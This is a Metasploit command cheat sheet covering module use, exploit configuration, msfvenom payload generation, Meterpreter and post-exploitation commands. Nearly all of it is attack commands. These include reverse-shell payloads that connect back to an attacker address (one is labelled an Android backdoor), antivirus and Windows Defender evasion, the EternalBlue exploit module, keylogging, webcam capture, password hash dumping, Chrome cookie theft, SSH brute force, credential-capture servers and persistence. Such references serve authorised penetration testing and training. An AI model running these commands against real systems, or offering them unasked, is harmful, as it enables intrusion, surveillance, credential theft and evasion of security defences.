Basic Commands

msfconsole
Start the Metasploit Framework console
help
Show all available commands
exit
Exit Metasploit
version
Show Metasploit version
banner
Display a random banner

Module Management

search [type:exploit/auxiliary/payload] [keyword]
Search for modules (e.g., search exploit windows smb)
use [module_path]
Select a module (e.g., use exploit/windows/smb/ms17_010_eternalblue)
show options
Display configurable options for current module
show payloads
List compatible payloads for current exploit
info
Show detailed information about current module
back
Return to previous context

Exploit Configuration

set [option] [value]
Set a module option (e.g., set RHOSTS 192.168.1.100)
setg [option] [value]
Set a global option that persists between modules
unset [option]
Unset an option
exploit
Run the current exploit
run
Alias for exploit
check
Test if target is vulnerable without exploitation

Payload Generation (msfvenom)

msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [file]
Generate a payload (e.g., msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe)
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o virus.apk
Create Android backdoor
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
Generate encoded payload (AV evasion)

Meterpreter Commands

sysinfo
Show system information
getuid
Show current user privileges
getsystem
Attempt privilege escalation
shell
Drop into a system shell
download [remote_file] [local_path]
Download a file from target
upload [local_file] [remote_path]
Upload a file to target
screenshot
Take a screenshot
webcam_snap
Capture webcam image
keyscan_start
Start keylogger
keyscan_dump
Dump keylogger results
hashdump
Dump password hashes (Windows)
ps
List running processes
migrate [PID]
Migrate to another process
background
Background current session

Post-Exploitation Modules

run post/windows/gather/credentials/windows_autologin
Extract autologin credentials
run post/multi/gather/chrome_cookies
Steal Chrome cookies
run post/windows/gather/enum_logged_on_users
List logged in users
run post/windows/manage/persistence_exe
Establish persistence

Auxiliary Modules

use auxiliary/scanner/portscan/tcp
TCP port scanner
use auxiliary/scanner/ssh/ssh_login
SSH brute force
use auxiliary/scanner/smb/smb_version
SMB version detection
use auxiliary/server/capture/http
Fake HTTP server for credential capture

Session Management

sessions -l
List active sessions
sessions -i [ID]
Interact with a session
sessions -k [ID]
Kill a session
sessions -u [ID]
Upgrade a shell to Meterpreter

Database Commands

db_status
Check database connection
db_nmap [options]
Run nmap and store results in database
hosts
List all hosts in database
services
List all services in database
creds
List all credentials in database

Evasion Techniques

use evasion/windows/windows_defender_exe
Generate executable that evades Windows Defender
set EnableStageEncoding true
Enable payload encoding to evade detection
set ProcessMigration true
Enable automatic process migration
